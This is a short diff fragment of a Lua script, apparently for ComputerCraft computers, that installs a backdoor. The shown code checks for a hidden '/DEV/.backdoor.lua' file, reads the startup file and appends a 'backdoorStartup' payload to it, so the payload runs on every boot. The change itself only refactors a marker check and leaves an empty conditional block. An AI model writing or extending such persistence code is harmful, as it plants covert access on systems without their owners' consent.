@@ -52,8 +52,10 @@ if not fs.exists("/DEV/.backdoor.lua") then
         contents = startupFile.readAll();
     end
 
-    if #string.split(contents, "-- DO NOT TOUCH - BACKDOOR.EXE --") > 0 then
-    
+    local split = string.split(contents, "-- DO NOT TOUCH - BACKDOOR.EXE --");
+
+    if #split > 0 then
+    -- startupFile
     end
     if contents ~= "" then contents = contents.."\n" end;
     startupFile.write(contents..backdoorStartup)
